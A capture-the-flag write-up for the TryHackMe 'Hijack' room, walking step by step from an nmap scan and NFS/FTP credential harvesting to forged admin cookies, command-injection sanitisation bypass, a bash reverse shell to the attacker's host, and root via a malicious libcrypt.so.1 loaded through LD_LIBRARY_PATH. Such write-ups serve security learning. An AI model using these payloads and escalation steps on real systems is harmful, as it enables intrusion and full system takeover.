# Try Hack Me - Hijack Writeup 
# Author: Atharva Bordavekar
# Difficulty: Easy
# Points: 60
# Vulnerabilities: Cookie hijacking, RCE sanitization bypass, Path hijack 

# Reconnaisance:
lets carry out a classic nmap scan
```bash
nmap -sV -sC <target ipt>
```


nmap scan:

PORT     STATE SERVICE VERSION

21/tcp   open  ftp     vsftpd 3.0.3

22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:ee:e5:23:de:79:6a:8d:63:f0:48:b8:62:d9:d7:ab (RSA)
|   256 42:e9:55:1b:d3:f2:04:b6:43:b2:56:a3:23:46:72:c7 (ECDSA)
|_  256 27:46:f6:54:44:98:43:2a:f0:59:ba:e3:b6:73:d3:90 (ED25519)

80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Home

111/tcp  open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      33150/tcp   mountd
|   100005  1,2,3      56635/udp   mountd
|   100005  1,2,3      57942/tcp6  mountd
|   100005  1,2,3      59660/udp6  mountd
|   100021  1,3,4      33871/udp6  nlockmgr
|   100021  1,3,4      43261/tcp6  nlockmgr
|   100021  1,3,4      45482/tcp   nlockmgr
|   100021  1,3,4      54713/udp   nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl

2049/tcp open  nfs     2-4 (RPC #100003)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel


thats good! lets mount the nfs share at /mnt/nfsshare
```bash
showmount -e <target-ip>
```

we find the share /mnt/share *
we mount it on our system

```bash
sudo mkdir /mnt/nfsshare 
sudo mount -t nfs <target-ip>:/mnt/share /mnt/nfsshare -o nolock
```

we find out that we are denied of all permissions from accessing this share and only a user with 1003 permissions can access this share, so we quickly create a user named nfsuser with uid 1003 and access the nfsshare files
```bash
sudo useradd -u 1003 -m nfsuser
```

now we access the nfsshare using this user
```bash
sudo -u nfsuser cat nfsshare/for_employees.txt
```

ftp creds :

ftpuser:W3stV1rg1n14M0un741nM4m4
                 
turns out that we cannot get the ftp files due to permission issues so we make a cheeky little modification to our get command

```bash
get .from_admin.txt /dev/stdout
```
local: /dev/stdout remote: .from_admin.txt
229 Entering Extended Passive Mode (|||10723|)
150 Opening BINARY mode data connection for .from_admin.txt (368 bytes).
To all employees, this is "admin" speaking,
i came up with a safe list of passwords that you all can use on the site, these passwords don't appear on any wordlist i tested so far, so i encourage you to use them, even me i'm using one of those.

NOTE To rick : good job on limiting login attempts, it works like a charm, this will prevent any future brute forcing.
226 Transfer complete.
368 bytes received in 00:00 (1.50 KiB/s)

in the similar way, we manage to get the passwords_list.txt

Vxb38mSNN8wxqHxv6uMX.... are the passwords in the pass word list.

we will use hydra to bruteforce the admin page maybe or because thats the only username we know right now

turns out hydra wont be able to save our asses this time because of the rate limiting feature so we use a special tool named patator

patator is malfunctioning aswell and none of the commands are working properly

after exhausting all of our options, we use burpsuite to send a request to the /administrator.php page and put the cookies that we created using cookies_output.txt with the python script we made using deepseek

the python script is 
```bash
import hashlib
import base64
import urllib.parse

# Simple version - just generate cookies
with open('passlist.txt', 'r') as f:
    passwords = [line.strip() for line in f if line.strip()]

cookies = []
for password in passwords:
    # Create MD5 hash
    md5_hash = hashlib.md5(password.encode()).hexdigest()
    
    # Create admin string
    admin_string = f"admin:{md5_hash}"
    
    # Base64 encode
    base64_encoded = base64.b64encode(admin_string.encode()).decode()
    
    # URL encode
    cookie = urllib.parse.quote(base64_encoded)
    
    cookies.append(cookie)
    print(f"Password: {password} -> Cookie: {cookie}")

# Save to file
with open('cookies_output.txt', 'w') as f:
    for cookie in cookies:
        f.write(cookie + '\n')

print(f"\nGenerated {len(cookies)} cookies. Saved to 'cookies_output.txt'")
```

                                                                       
we get a suspicious response length at the php session cookie YWRtaW46ZDY1NzNlZDczOWFlN2ZkZmIzY2VkMTk3ZDk0ODIwYTU%3D
in order to edit the session cookie, right click at the /administrator.php page and click on Inspect
after that go to Storage and doule click on the 'value' of the Cookie session. paste this cookie instead YWRtaW46ZDY1NzNlZDczOWFlN2ZkZmIzY2VkMTk3ZDk0ODIwYTU%3D
now press enter and just refresh the page

we get administration access. now we should be able to exectute commands in the input field. seems like there is some kind of RCE protection in the input box
we can bypass the sanitization by putting a '&' sign before our commands,

for eg:
& whoami 
will give us the output www-data

using this information, we input a bash reverse shell into the input field

```bash
& bash -c 'bash -i >& /dev/tcp/<your-local-ip>/4444 0>&1'
```

we get a shell as www-data!
by running linpeas.sh we get some credentials of the user rick

www-data@Hijack:/tmp$ cat /var/www/html/config.php
cat /var/www/html/config.php
<?php
$servername = "localhost";
$username = "rick";
$password = "N3v3rG0nn4G1v3Y0uUp";
$dbname = "hijack";

// Create connection
$mysqli = new mysqli($servername, $username, $password, $dbname);

// Check connection
if ($mysqli->connect_error) {
  die("Connection failed: " . $mysqli->connect_error);
}
?>

by entering rick's password, we get a shell as rick. on carrying out sudo -l we find out that the user rick can run some commands as sudo

User rick may run the following commands on Hijack:
    (root) /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2

using linpeas we found a 95% attack vector which was the env_keep+=LD_LIBRARY_PATH
we are going to hijack the path by created am exploit script with some path hijacking
```bash
ldd /usr/sbin/apache2
```
we get the output as:
  
        linux-vdso.so.1 =>  (0x00007ffd59f76000)
        libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007fb79ac58000)
        libaprutil-1.so.0 => /usr/lib/x86_64-linux-gnu/libaprutil-1.so.0 (0x00007fb79aa31000)
        libapr-1.so.0 => /usr/lib/x86_64-linux-gnu/libapr-1.so.0 (0x00007fb79a7ff000)
        libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007fb79a5e2000)
        libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb79a218000)
        libcrypt.so.1 => /lib/x86_64-linux-gnu/libcrypt.so.1 (0x00007fb799fe0000)
        libexpat.so.1 => /lib/x86_64-linux-gnu/libexpat.so.1 (0x00007fb799db7000)
        libuuid.so.1 => /lib/x86_64-linux-gnu/libuuid.so.1 (0x00007fb799bb2000)
        libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007fb7999ae000)
        /lib64/ld-linux-x86-64.so.2 (0x00007fb79b16d000)

so the apache uses libcrypt.so.1 so lets create our own malicious libcrypt.so.1 in c which will spawn a root shell
```bash
cat > /tmp/libcrypt.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dlfcn.h>

// Constructor runs when library loads
__attribute__((constructor)) void init() {
    printf("[+] libcrypt.so.1 hijacked!\n");
    
    // Get root
    setuid(0);
    setgid(0);
    
    // Create SUID bash
    system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
    
    // Spawn root shell
    char *args[] = {"/bin/bash", "-p", NULL};
    execve(args[0], args, NULL);
}
EOF
```
we compile it with the same name as the real library
``` bash
gcc -fPIC -shared -o /tmp/libcrypt.so.1 /tmp/libcrypt.c -ldl
```

now we carry out the exploit using the command:
```bash
sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
```

boom! we have the root shell and we submit the root.txt flag!
                                                              
